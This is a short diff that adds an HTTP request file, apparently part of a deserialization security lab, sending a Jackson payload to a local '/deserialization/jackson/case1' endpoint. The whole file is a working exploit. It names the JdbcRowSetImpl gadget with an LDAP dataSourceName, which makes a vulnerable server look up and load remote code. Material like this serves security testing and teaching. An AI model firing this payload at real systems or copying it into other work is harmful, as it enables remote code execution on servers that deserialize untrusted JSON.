@@ -1,0 +1,8 @@
+###
+# jackson
+POST /deserialization/jackson/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/0mghfs","autoCommit":true}
+
